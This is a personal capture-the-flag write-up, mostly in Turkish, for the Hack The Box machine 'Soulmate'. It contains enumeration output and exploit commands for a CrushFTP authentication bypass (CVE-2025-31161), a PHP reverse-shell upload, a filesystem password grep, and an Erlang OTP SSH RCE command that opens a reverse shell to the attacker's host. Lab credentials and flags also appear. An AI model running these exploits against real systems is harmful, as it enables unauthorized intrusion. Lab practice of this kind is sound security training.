
# Soulmate - Linux - Easy

# IP= `10.10.11.86`


---------------------------------------------------------------

# enum

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; 
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4369/tcp open  epmd    syn-ack ttl 63 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ssh_runner: 45919
```


## ports: 22,80,4369

---------------------------------------------------------------

# web - port80

## GET HEAD POST OPTIONS

## register.php file upload vuln?
username pass ve image import fieldı var.
1) php webshell aldım revshell.com'dan.
2) uzantısını png olarak değiştirdim.
3) upload. şuraya kaydetti: `http://soulmate.htb/assets/images/profiles/3_1763186298.png`. error var display edemiyorum diyo
4) sadece image uzantısı istiyor: rev.php2 adıyla client side filterı bypass ediyorum.
> https://hackviser.com/tactics/pentesting/web/file-upload iyi kaynak!

şimdilik dursun.

## vhost

`--append domain` ve `-r` (follow redirect) ile çalıştırınca buldu.
!! NORMALDE bulmuoyr
```bash
gobuster vhost -u http://soulmate.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -r

ftp.soulmate.htb Status: 200 [Size: 21438]
```

## dirsearch
feroxbuster
```bash
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css
200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      306l     1061w    16688c http://soulmate.htb/
301      GET        7l       12w      178c http://soulmate.htb/assets => http://soulmate.htb/assets/
301      GET        7l       12w      178c http://soulmate.htb/assets/images => http://soulmate.htb/assets/images/
403      GET        7l       10w      162c http://soulmate.htb/assets/
301      GET        7l       12w      178c http://soulmate.htb/assets/css => http://soulmate.htb/assets/css/
403      GET        7l       10w      162c http://soulmate.htb/assets/css/
301      GET        7l       12w      178c http://soulmate.htb/assets/images/profiles => http://soulmate.htb/assets/images/profiles/
[####################] - 2m    150005/150005  0s      found:10      errors:0      
[####################] - 89s    30000/30000   338/s   http://soulmate.htb/ 
[####################] - 88s    30000/30000   342/s   http://soulmate.htb/assets/ 
[####################] - 88s    30000/30000   342/s   http://soulmate.htb/assets/css/ 
[####################] - 88s    30000/30000   342/s   http://soulmate.htb/assets/images/ 
[####################] - 88s    30000/30000   343/s   http://soulmate.htb/assets/images/profiles/
```
yeni bişi yok


# web ftp.soulmate.htb
redirect eidoyr: `http://ftp.soulmate.htb/WebInterface/login.html`
cruch ftp diye bişi var.

## auth bypass CVE-2025-31161
>https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation

ibrahimsql exploiti yazmış.

```bash
searchsploit crush
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Crush FTP 5 - 'APPE' Remote JVM Blue Screen of Death (PoC)                   | windows/dos/17795.py
CrushFTP 11.3.1 - Authentication Bypass                                      | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities                                    | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal                                      | multiple/remote/52012.py
Tomabo MP4 Converter 3.10.12 < 3.11.12 - '.m3u' File Crush Application (Deni | windows_x86/dos/38444.py
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
➜  enum cd ..                                                     
➜  soulmate cd web
➜  web searchsploit -m 52295
  Exploit: CrushFTP 11.3.1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/52295
     Path: /usr/share/exploitdb/exploits/multiple/remote/52295.py
    Codes: CVE-2025-31161
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/menesay/htb/soulmate/web/52295.py
```


```bash
python3 52295.py --target ftp.soulmate.htb --exploit --new-user aaa --password 111 --port 80
```

## CRED: `aaa:111`

bitürrlü rce yapamadım

> https://github.com/issamjr/CVE-2025-54309-EXPLOIT
bu da https'de çalışıyo sadece. gemini'a verip http yap dedim.
```python

```
olmadı

ben de yine admin user oluşturdum.
admin paneli inceleyince admine upload yetkisi vermem gerktiğini fark ettim.
verdim. ve revshell

```
/app/WebInterface/gentilkiwi.php 
```
burda phpler yok ve çalışmadı


bu dizinde phpler var ve burda çalıştı.
```
/app/webProd/gentilkiwi.php 
```

---------------------------------------------------------------

# erlang port mapper daemon - port 4369
> Erlang; yüksek düzeyde eşzamanlı (concurrent), dağıtık (distributed) ve hataya dayanıklı (fault-tolerant) sistemler oluşturmak için tasarlanmış fonksiyonel bir programlama dilidir
> epmd ile erlang node'larını symbolic bir şekilde bağlar.

## enum
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info $IP 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-14 21:49 PST
Nmap scan report for 10.10.11.86
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ssh_runner: 45919
```


---------------------------------------------------------------

# Initial access - www-data

şöyle bir password arama:
```bash
grep --color=auto -rnw "/" -ie "PASSWORD=" --color=always 2> /dev/null
```

erlang içinde buldu

## ssh CRED: `ben:HouseH0ldings998`


---------------------------------------------------------------

# ssh - ben

# user.txt : `95e7498f333f2a86b2cc9093ff507069`


## CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
zaten erlang vardı ben de 5 dklık version araştırmasıyla buldum

uzun süre çalışmadı. vuln evet ama rce gelmiyor.
sonra fark ettim ki 2222 bize kapalı. netstat -noa ile görünüyor.
o zaman exploitte --port 2222 yaptım:

ve ben salak gibi kendi makinemde çalıştırıyom. sunucuya taşıyıp yaptım. çünkü
localporta ordan erişebiliyorum
```bash
ben@soulmate:/dev/shm$ python3 privesc.py 127.0.0.1 --port 2222 --shell --lhost 10.10.16.85 --lport 1401
```

# root.txt : `164f616c4a1912806aec637e7aea1223`


---------------------------------------------------------------